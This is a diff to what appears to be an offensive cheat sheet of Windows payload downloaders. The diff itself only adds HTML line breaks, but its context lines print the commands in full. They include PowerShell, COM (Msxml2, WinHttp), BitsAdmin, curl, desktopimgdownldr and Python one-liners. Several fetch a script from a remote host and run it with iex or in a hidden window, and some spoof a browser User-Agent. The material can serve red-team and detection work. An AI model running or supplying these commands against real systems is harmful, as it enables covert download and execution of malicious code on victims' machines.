@@ -2120,6 +2120,7 @@ Powershell Downloaders<br />
 
       powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
 
+<br />
 COM Donwloaders<br />
 
       $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
@@ -2133,6 +2134,7 @@ COM Donwloaders<br />
       [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
 
 
+<br />
 BitsAdmin Downloaders<br />
 
       powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
@@ -2141,16 +2143,19 @@ BitsAdmin Downloaders<br />
 
       powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko  http://192.168.1.73/hello.ps1 $env:tmp\\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\\hello.ps1'
 
+<br />
 Curl Downloaders<br />
 
       cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
 
       cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
 
+<br />
 desktopimgdownldr Downloaders<br />
 
       set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 
+<br />
 Python Downloaders<br />
 
       #!/usr/bin/python
@@ -2160,6 +2165,7 @@ Python Downloaders<br />
       localFile.write(u.read())
       localFile.close()
 
+<br />
 VbScript Downloaders (VBS)<br />
 
 
